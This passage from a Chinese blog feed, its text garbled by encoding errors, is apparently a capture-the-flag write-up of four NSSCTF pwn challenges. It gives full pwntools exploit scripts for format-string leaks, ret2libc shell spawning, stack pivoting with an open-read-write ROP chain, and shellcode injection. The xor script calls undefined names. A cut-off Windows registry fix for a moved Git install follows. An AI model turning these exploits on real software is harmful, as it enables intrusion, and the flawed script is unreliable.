    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF Round#14 Basic WP</title>
    <link href="/2023/08/04/NSSCTF-Round-14-Basic-WP/"/>
    <url>/2023/08/04/NSSCTF-Round-14-Basic-WP/</url>
    
    <content type="html"><![CDATA[<p>å‘¨æœ« NSS çš„ PWN ä¸“é¢˜ï¼Œèœèœçš„ç…§ç€åˆ«çš„å¸ˆå‚…çš„ WP å¤ç°ä¸€ä¸‹ğŸ«¥</p><span id="more"></span><h1 id="love"><a href="#love" class="headerlink" title="love"></a>love</h1><blockquote><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²+ret2libc</p></blockquote><p>æ˜¯ä¸ª64ä½çš„ç¨‹åºï¼Œå¼€å¯äº† canary ä¿æŠ¤</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_main.png"></p><p>ä¸»å‡½æ•°ä¸­æœ‰ä¸€ä¸ªæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåœ¨ <code>vlun</code> å‡½æ•°ä¸­ gets ä¸é™åˆ¶è¾“å…¥</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_vuln.png"></p><p>è€ƒè™‘é‡Œç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ² libc åŸºå€ï¼Œè®¡ç®—åç§»è·å– system åœ°å€ã€‚å†åˆ©ç”¨ gets æ”¹å†™ GOT è¡¨è·å– shellã€‚</p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²éƒ¨åˆ† buf å­˜å‚¨åœ¨ BSS æ®µä¸Šï¼Œéœ€è¦å€Ÿç”¨æ ˆä¸Šçš„è·³æ¿ã€‚åˆ©ç”¨ GDB æŸ¥çœ‹ printf å¤„çš„æ ˆæ•°æ®ï¼š</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_love_stack.png"></p><p>æ ˆä¸Šçš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬ä¹ä¸ªå‚æ•° 0x7fffffffdfb8 å­˜å‚¨çš„æ˜¯0x7fffffffdfa8 åœ°å€ï¼Œè€Œè¿™ä¸ªåœ°å€å­˜å‚¨ v4 çš„æ•°å€¼ ï¼ˆ555LL å°±æ˜¯ä»¥åå…­è¿›åˆ¶å­˜å‚¨555 è¿™ä¸ªåè¿›åˆ¶æ•°å­—ï¼Œå°±æ˜¯ 0x22bï¼›åŒç† 520LLå°±æ˜¯ 0x208ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ¥æ”¹å†™ V4 æ•°å€¼å®ç° main å‡½æ•°ä¸­çš„ if æ¡ä»¶åˆ¤æ–­è¿›å…¥ vuln æ¼æ´å‡½æ•°ã€‚</p><p>åŒæ—¶æ ˆä¸Šçš„ç¬¬ä¹ä¸ªå‚æ•° ( <code>%15$</code> )å­˜å‚¨çš„æ˜¯ canary çš„å€¼ï¼Œç¬¬åä¸€ä¸ªå‚æ•° ( <code>%17$</code> ) æŒ‡å‘ <code>__libc_start_main+231</code>ï¼Œå¯ä»¥æ¨ç®—å‡º libc çš„åŸºå€ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å°±æ„é€ ä¸º <code>%520c%9$n,,%15$p,,%17$p</code>ï¼ˆå…¶ä¸­ <code>,,</code> ç”¨æ¥åˆ†éš”ä¸åŒåœ°å€ï¼‰</p><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>) <br>io=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>pop_rdi=<span class="hljs-number">0x4013f3</span><br>ret=<span class="hljs-number">0x40101a</span><br><br>payload=<span class="hljs-string">&quot;%520c%9$n,,%15$p,,%17$p&quot;</span><br>io.recvuntil(<span class="hljs-string">&#x27;I want to hear your praise of Toka\n&#x27;</span>)<br>io.sendline(payload)<br><br>io.recvuntil(<span class="hljs-string">b&quot;,,&quot;</span>)<br>canary=<span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;,,&quot;</span>)<br>base=<span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-libc.sym[<span class="hljs-string">b&quot;__libc_start_main&quot;</span>]-<span class="hljs-number">231</span><br>sys_addr=base+libc.sym[<span class="hljs-string">b&quot;system&quot;</span>]<br>sh_addr=base+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>payload=cyclic(<span class="hljs-number">0x28</span>)+p64(canary)+p64(<span class="hljs-number">0</span>)+p64(ret)+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)<br>io.sendlineafter(<span class="hljs-string">b&quot;I know you like him, but you must pass my level\n&quot;</span>,payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="rbp"><a href="#rbp" class="headerlink" title="rbp"></a>rbp</h1><blockquote><p>æ ˆè¿ç§» + orw</p></blockquote><p><code>vuln()</code> å‡½æ•°é‡Œé¢æœ‰ä¸€ä¸ªé•¿åº¦0x10 çš„æ ˆæº¢å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè€ƒè™‘æ ˆè¿ç§»çš„åˆ©ç”¨ ã€‚åŒæ—¶åœ¨ <code>init()</code> é‡Œé¢è°ƒç”¨äº†<code>sandbox()</code> ç¦ç”¨äº†execveï¼Œæ‰€ä»¥è¦ä½¿ç”¨ orw ã€‚</p><p>é¦–å…ˆç§»æ ˆåˆ° bss ç„¶ååˆ©ç”¨ leave_ret ï¼Œç§»æ ˆåˆ°å‰éƒ¨æ‰§è¡Œæ³„éœ²å¹¶å›åˆ° vuln</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>) <br>io=process(<span class="hljs-string">&#x27;./rbp&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./rbp&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>bss=<span class="hljs-number">0x404800</span><br>leave_ret=<span class="hljs-number">0x40121d</span><br>pop_rdi=<span class="hljs-number">0x401353</span><br>read_addr=<span class="hljs-number">0x401292</span><br>vuln_addr=<span class="hljs-number">0x401270</span><br>puts_got=elf.got[<span class="hljs-string">b&quot;puts&quot;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">b&quot;puts&quot;</span>]<br><br>payload=cyclic(<span class="hljs-number">0x210</span>)+p64(bss)+p64(read_addr) <br>io.sendafter(<span class="hljs-string">b&quot;try it&quot;</span>,payload)<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)<br>payload= payload.ljust(<span class="hljs-number">0x210</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(bss-<span class="hljs-number">0x210</span>)+p64(leave_ret)<br><br>io.sendline(payload)<br>leak_addr=u64(io.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))-libc.sym[<span class="hljs-string">b&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak_addr: &quot;</span>+<span class="hljs-built_in">hex</span>(leak_addr))<br>open_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;open&quot;</span>]<br>read_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;read&quot;</span>]<br>write_addr=leak_addr+libc.sym[<span class="hljs-string">b&quot;write&quot;</span>]<br><span class="hljs-comment">#pop_rsi = libc.address + next(libc.search(asm(&#x27;pop rsi;ret&#x27;))) </span><br><span class="hljs-comment">#pop_rdx = libc.address + next(libc.search(asm(&#x27;pop rdx;ret&#x27;))) </span><br><span class="hljs-comment">#ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ç”¨ä¸Šé¢çš„å‘½ä»¤çªç„¶å°±æŠ½é£ä¸å¥½ç”¨æˆ‘æ‰‹åŠ¨ROPgadgetæ‰¾çš„ï¼Œå°±æ˜¯æœ‰ç‚¹å­æ…¢</span><br>pop_rsi=leak_addr+<span class="hljs-number">0x2601f</span><br>pop_rdx=leak_addr+<span class="hljs-number">0x142c92</span><br><br>payload=cyclic(<span class="hljs-number">0x210</span>)+p64(bss+<span class="hljs-number">0x300</span>-<span class="hljs-number">0x210</span>)+p64(read_addr)<br>io.sendafter(<span class="hljs-string">b&quot;try it\n&quot;</span>,payload)<br><br>orw=<span class="hljs-string">b&quot;/flag\x00\x00\x00&quot;</span>+p64(pop_rdi)+p64(<span class="hljs-number">0x404288</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>orw+=p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x404a00</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0x50</span>)+p64(read_addr)<br>orw+=p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi)+p64(<span class="hljs-number">0x404a00</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0x50</span>)+p64(write_addr)<br><br>orw=orw.ljust(<span class="hljs-number">0x210</span>,<span class="hljs-string">b&quot;a&quot;</span>)+p64(bss+<span class="hljs-number">0x300</span>-<span class="hljs-number">0x210</span>)+p64(leave_ret)<br>io.send(orw)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p>é¢˜ç›®æ˜¯ä¸€ä¸ªä»»ä½•ä¿æŠ¤éƒ½æ²¡æœ‰è¢«å¼€å¯å¹¶ä¸” rwx å…¨éƒ¨å¼€å¯çš„ç¨‹åº</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_xor_main.png"></p><p>é¦–å…ˆç¨‹åºä¸­æœ‰ä¸€ä¸ª flag åˆ¤æ–­çš„å¾ªç¯ï¼Œæˆ‘ä»¬è¦ä¿è¯ flag å°äº 0 ç¨‹åºæ‰ä¸ä¼šé€€å‡ºï¼Œæ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œæ¥ä¸‹æ¥çš„æ“ä½œã€‚</p><p>æˆ‘ä»¬å¯ä»¥å°† flag çš„é«˜ä½å†™æˆ 0xffï¼Œè¿™æ ·çš„è¯ flag çš„ç¬¦å·ä½ä¼šè¢«è¦†å†™ä¸º1ï¼Œå³è´Ÿæ•°ã€‚</p><p><code>xorByteWithAddress()</code> ä¸­åªæœ‰ä¸¤è¡Œä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">xorByteWithAddress</span><span class="hljs-params">(_BYTE *a1, <span class="hljs-type">char</span> a2)</span><br>&#123;<br>  *a1 ^= a2;  <span class="hljs-comment">//*addr ^= value</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)++flag;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>a1</code> æ˜¯ä¸€ä¸ªæŒ‡å‘ <code>_BYTE</code> ç±»å‹çš„åœ°å€ï¼ˆå³ä¸€ä¸ªå­—èŠ‚å¤§å°çš„æ•°æ®ç±»å‹ï¼‰ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªå¼‚æˆ–çš„æ“ä½œä¸­ï¼Œä¸€æ¬¡åªèƒ½å¼‚æˆ–æ”¹å†™ä¸€å­—èŠ‚çš„æ•°æ®ã€‚</p><p>å› ä¸º rwx å¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å‘ä¸Šé¢å†™å…¥ sehllcodeï¼ŒåŠ«æŒ <code>fini_array</code> æŒ‡é’ˆåˆ°shellcodeå¤„ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å†æ¬¡å¼‚æˆ–ä»¤ flag å¤§äºé›¶ï¼Œé€€å‡ºç¨‹åºæ—¶æ‰§è¡Œ shellcode äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xorwrite</span>(<span class="hljs-params">addr,value</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;addr:&quot;</span>,<span class="hljs-built_in">hex</span>(addr).encode())<br>    io.sendlineafter(<span class="hljs-string">b&quot;value:&quot;</span>,value)<br><br>flag=<span class="hljs-number">0x600BCC</span><br>fini_array=<span class="hljs-number">0x600970</span><br>rwx_addr=<span class="hljs-number">0x600d00</span><br><br>xorwrite(flag+<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;0xff&#x27;</span>)<br><br>shellcode=asm(shellcraft.sh())<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(shellcode)):<br>    xorwrite(rwx+i,shellcode[i])<br>    <br><span class="hljs-comment">#xor_array=fini_array^rwx_addr</span><br><span class="hljs-comment">#xor_array=0x200b10</span><br>xorenc(<span class="hljs-built_in">hex</span>(fini_array).encode(),<span class="hljs-string">b&quot;0x10&quot;</span>)<br>xorenc(<span class="hljs-built_in">hex</span>(fini_array+<span class="hljs-number">1</span>).encode(),<span class="hljs-string">b&quot;0x0b&quot;</span>)<br>xorenc(<span class="hljs-built_in">hex</span>(fini_array+<span class="hljs-number">2</span>).encode(),<span class="hljs-string">b&quot;0x20&quot;</span>)<br>    <br>xorwrite(flag+<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;0xff&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="read-file"><a href="#read-file" class="headerlink" title="read_file"></a>read_file</h1><p>æ˜¯ä¸€ä¸ª64ä½çš„èœå•å¼çš„è¯»å–æ–‡ä»¶çš„ç¨‹åºï¼Œè¿œç¨‹æ—¶å¯ä»¥ç›´æ¥è¯»å–æœåŠ¡å™¨ç«¯çš„æ–‡ä»¶ã€‚</p><p>ä½†æ˜¯åœ¨ load_file å¤„æœ‰ â€œflagâ€ å­—ç¬¦æ£€æµ‹ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸èƒ½ç›´æ¥ load flagï¼Œè¦å°è¯•ä¿®æ”¹ flag æ–‡ä»¶çš„ â€œflagâ€ å­—ç¬¦ã€‚</p><p>åŒæ—¶åœ¨ read_file å¤„æœ‰æ–‡æœ¬é•¿åº¦çš„åˆ¤æ–­ï¼Œä¸è¿‡é•¿ç´ è´¨ç”±ç”¨æˆ·è¾“å…¥ï¼Œå°äº55æ—¶ä¼šè‡ªåŠ¨è¯»å– content_size + 56 çš„æ•°æ®ã€‚</p><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦ç»•è¿‡ flag çš„æ£€æŸ¥ã€‚</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_readfile_load.png"></p><p>åœ¨ <code>load_file()</code> å‡½æ•°ä¸­ï¼Œscanf è´Ÿè´£æ¥å—ç”¨æˆ·è¯»å…¥ä¿¡æ¯ã€‚æˆ‘ä»¬çŸ¥é“scanfè¯»å–æ•°æ®ä¼šåœ¨æŒ‡å®šé•¿åº¦çš„æ•°æ®åæ·»åŠ <code>\x00 </code>ç©ºå­—ç¬¦</p><p><img src="/img/NSSCTF-Round-14-Basic-WP/Round14_readfile_bss.png"></p><p>å¦‚ä¸Šå›¾ï¼Œ<em>file_name</em> å’Œ <em>file_id</em> éƒ½æ˜¯å‚¨å­˜åœ¨ BSS æ®µå¹¶ä¸”ç›¸é‚»ï¼Œåç§»ç›¸å·® 8 å­—èŠ‚ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬åœ¨ file_name è¯»å–äº†åˆšå¥½8å­—èŠ‚çš„æ•°æ®ï¼Œå…¶å¯¹åº”çš„ <code>\x00</code> å°±ä¼šè¦†ç›–ä½ <em>file_id</em>ï¼Œä½¿ <em>file_id</em> ä¸º 0ã€‚</p><p>è€Œåˆ©ç”¨åˆ° fild_id çš„å‡½æ•° <code>read(file_fd, file_content, content_size);</code> åœ¨ fild_id&#x3D;0 æ—¶ä¼šä»ç”¨æˆ·é”®ç›˜æ¥è·å–ç”¨æˆ·çš„è¾“å…¥è€Œä¸æ˜¯è¯»å–æ–‡ä»¶ã€‚</p><p>åˆå› ä¸ºåœ¨æ­¤ä¹‹å‰ç”± alloca æ¥åˆ†é… v2 æ ˆç©ºé—´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ content_size å°äº55çš„æ¡ä»¶åˆ¤æ–­é€ æˆæº¢å‡ºï¼Œç›´æ¥è¦†ç›–è¿”å›åœ°å€ä½¿ç¨‹åºè·³è½¬åˆ° <code>file_fd = open(file_name, 0, 0LL);</code>ï¼Œç»•è¿‡æ£€æŸ¥å†æŒ‰ç…§ç¨‹åºæµç¨‹æ­£å¸¸è¯»å– flag ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">payload</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&quot;file_name : &quot;</span>,payload)<br>    <br>load_addr=<span class="hljs-number">0x401493</span><br>read_addr=<span class="hljs-number">0x4014ee</span><br>ret=<span class="hljs-number">0x40101a</span><br><br>load(<span class="hljs-string">b&quot;./&quot;</span>)<br>load(<span class="hljs-string">b&quot;flag.txt&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;file_content_length : &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload=cyclic(<span class="hljs-number">0x18</span>)+p64(load_addr)+p64(ret)*<span class="hljs-number">2</span>+p64(read_addr)<br>io.sendafter(<span class="hljs-string">b&quot;read more &quot;</span>,payload)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;file_content_length : &quot;</span>,<span class="hljs-string">b&quot;1&quot;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ¼å¼åŒ–å­—ç¬¦ä¸²</tag>
      
      <tag>libc</tag>
      
      <tag>orw</tag>
      
      <tag>stack pivoting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¨‹åºä¿®æ”¹è·¯å¾„åå›¾æ ‡æ¶ˆå¤±åŠå³é”®æ— æ³•æ‰“å¼€çš„è§£å†³æ–¹æ¡ˆ</title>
    <link href="/2023/07/24/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <url>/2023/07/24/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<p>ä¿®æ”¹ç¨‹åºè·¯å¾„åéœ€è¦è¿›è¡Œçš„ä¸€äº›æ“ä½œ </p><span id="more"></span><h2 id="æ›´æ”¹Gitç›®å½•åï¼Œé¼ æ ‡å³é”®ç‚¹å‡»Git-Bash-Hereå‡ºç°æ‰¾ä¸åˆ°åº”ç”¨ç¨‹åºåŠå›¾æ ‡å˜ç°"><a href="#æ›´æ”¹Gitç›®å½•åï¼Œé¼ æ ‡å³é”®ç‚¹å‡»Git-Bash-Hereå‡ºç°æ‰¾ä¸åˆ°åº”ç”¨ç¨‹åºåŠå›¾æ ‡å˜ç°" class="headerlink" title="æ›´æ”¹Gitç›®å½•åï¼Œé¼ æ ‡å³é”®ç‚¹å‡»Git Bash Hereå‡ºç°æ‰¾ä¸åˆ°åº”ç”¨ç¨‹åºåŠå›¾æ ‡å˜ç°"></a>æ›´æ”¹Gitç›®å½•åï¼Œé¼ æ ‡å³é”®ç‚¹å‡»Git Bash Hereå‡ºç°æ‰¾ä¸åˆ°åº”ç”¨ç¨‹åºåŠå›¾æ ‡å˜ç°</h2><p>æˆ‘åˆšæ”¾å‡çš„æ—¶å€™æ•´ç†äº†è‡ªå·±çš„æ–‡ä»¶ä»¬ï¼Œå°±æŠŠ git çš„å®‰è£…ç›®å½•æ”¹äº†ï¼Œæˆ‘æƒ³è¦ç”¨ git ä¼ å¤§æ–‡ä»¶ä¸Š github å°±å‡ºç°äº†å¦‚é¢˜æ‰€è§çš„é—®é¢˜</p><p><img src="/img/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/Snipaste_2023-07-24_11-38-05.png"></p><p>åœ¨è¿™é‡Œç‚¹å‡»çš„æ—¶å€™æ‰“ä¸å¼€ï¼Œåªæœ‰æ‰‹åŠ¨æ‰“å¼€ Git æ‰ä¼šå¼¹å‡ºå¼¹çª—</p><p>è¿™æ˜¯å› ä¸ºæ³¨å†Œè¡¨æ²¡æœ‰ä¿®æ”¹</p><p>win+Rï¼Œè¾“å…¥ regedit æ‰“å¼€æ³¨å†Œè¡¨</p><p>Ctrl+F æŸ¥æ‰¾ç›®å½• HKEY_CLASSES_ROOT\ Directory \ Background \ shell \</p><p><img src="/img/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/Snipaste_2023-07-24_12-02-51.png"></p><p>å°±ä¼šå‘ç°æ³¨å†Œè¡¨ä¸­çš„åœ°å€è¿˜æ˜¯åŸæ¥çš„åœ°å€ï¼Œä¿®æ”¹ä¸ºç§»åŠ¨åçš„åœ°å€å³å¯</p><p>è¿˜æœ‰ä¸‹é¢çš„shellæ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°gitç›¸å…³çš„éƒ¨åˆ†ä¹Ÿéœ€è¦ä¿®æ”¹ï¼Œåœ¨git_guiä¸»ç›®å½•ç‚¹ä¸€æ¬¡ï¼Œcommdå•ç‹¬å†ç‚¹å¼€ã€‚æ€»å…±éœ€è¦ä¿®æ”¹å…«å¤„ã€‚</p><p>ä¿®æ”¹åå°±å¯ä»¥å•¦</p><h2 id="ä¿®æ”¹ç¨‹åºè·¯å¾„åï¼Œç¨‹åºä»å¯ä½¿ç”¨ä½†å›¾æ ‡æ¶ˆå¤±æˆ–å˜æˆç™½å—"><a href="#ä¿®æ”¹ç¨‹åºè·¯å¾„åï¼Œç¨‹åºä»å¯ä½¿ç”¨ä½†å›¾æ ‡æ¶ˆå¤±æˆ–å˜æˆç™½å—" class="headerlink" title="ä¿®æ”¹ç¨‹åºè·¯å¾„åï¼Œç¨‹åºä»å¯ä½¿ç”¨ä½†å›¾æ ‡æ¶ˆå¤±æˆ–å˜æˆç™½å—"></a>ä¿®æ”¹ç¨‹åºè·¯å¾„åï¼Œç¨‹åºä»å¯ä½¿ç”¨ä½†å›¾æ ‡æ¶ˆå¤±æˆ–å˜æˆç™½å—</h2><p>ä»¥Git Bashä¸ºä¾‹</p><p>è¿™æ˜¯å› ä¸ºæˆ‘ä»¬ç‚¹å‡»çš„å›¾æ¡ˆå’Œæœç´¢æˆ–æ˜¯å¯¼èˆªæ ä¸­æ˜¾ç¤ºçš„å›¾æ ‡éƒ½æ˜¯â€å¿«æ·æ–¹å¼â€œï¼Œè€Œå®ƒå¯¹åº”çš„è·¯å¾„æ²¡æœ‰ä¿®æ”¹</p><p>æ‰¾åˆ°æ¡Œé¢æˆ–è€…å¼€å§‹èœå•ä¸‹æ‰¾åˆ° Git Bash 